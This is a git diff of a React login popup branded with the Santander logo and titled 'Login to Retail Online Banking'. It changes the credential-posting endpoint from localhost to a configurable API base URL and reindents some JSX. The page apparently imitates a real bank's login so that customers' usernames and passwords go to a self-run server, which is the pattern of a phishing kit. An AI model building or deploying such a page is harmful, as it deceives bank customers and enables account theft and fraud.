@@ -2,6 +2,7 @@ import React, { useState, FormEvent, useEffect, RefObject } from 'react';
 import { X } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import { useAuth } from '../contexts/AuthContext';
+import { API_BASE_URL } from '../config';
 
 export type LoginStatus = {
   type: 'idle' | 'loading' | 'error' | 'success';
@@ -52,7 +53,7 @@ const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) =
     setStatus({ type: 'loading' });
 
     try {
-      const response = await fetch('http://localhost:5000/api/login', {
+      const response = await fetch(`${API_BASE_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username, password, website }),
@@ -100,13 +101,13 @@ const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) =
         <div className="bg-white rounded-lg shadow-lg border border-gray-200 p-2 w-[180px] text-[11px] relative">
           <div className="flex justify-between items-center mb-1">
             <img src="/santander-logo.svg" alt="Santander Logo" className="h-4 mb-1" />
-            <button 
-              onClick={onClose}
+        <button 
+          onClick={onClose}
               className="text-gray-400 hover:text-gray-600 ml-2"
-              aria-label="Close"
-            >
+          aria-label="Close"
+        >
               <X className="h-4 w-4" />
-            </button>
+        </button>
           </div>
           <h2 className="text-xs font-semibold text-gray-700 text-center mb-2">Login to Retail Online Banking</h2>
           <form onSubmit={handleSubmit}>
@@ -138,8 +139,8 @@ const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) =
             </div>
             <div className="hidden" aria-hidden="true">
                 <label htmlFor="website">Do not fill this out</label>
-                <input 
-                    type="text" 
+                <input
+                  type="text"
                     id="website" 
                     name="website" 
                     tabIndex={-1} 
@@ -153,13 +154,13 @@ const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) =
                 {status.message}
               </div>
             )}
-            <button
-              type="submit"
+              <button
+                type="submit"
               className="w-full bg-red-600 hover:bg-red-700 text-white py-1 px-2 rounded-md font-bold text-[11px] transition-colors disabled:bg-red-400 mt-1"
               disabled={status.type === 'loading'}
-            >
+              >
               {status.type === 'loading' ? 'Verifying...' : 'Login'}
-            </button>
+              </button>
           </form>
           <div className="mt-2 border-t pt-2 space-y-1">
              <a href="#" className="block text-[10px] text-center text-blue-600 hover:underline">Forgot user ID?</a>
@@ -170,10 +171,10 @@ const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) =
              <div className="flex space-x-1">
                 <select id="online-services" className="flex-grow w-full px-1 py-1 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-red-500 text-[10px]">
                     <option>Retail Online Banking</option>
-                </select>
+            </select>
                 <button className="bg-red-600 text-white px-2 rounded-md text-[10px] font-bold hover:bg-red-700">
                   Ok
-                </button>
+            </button>
              </div>
           </div>
         </div>
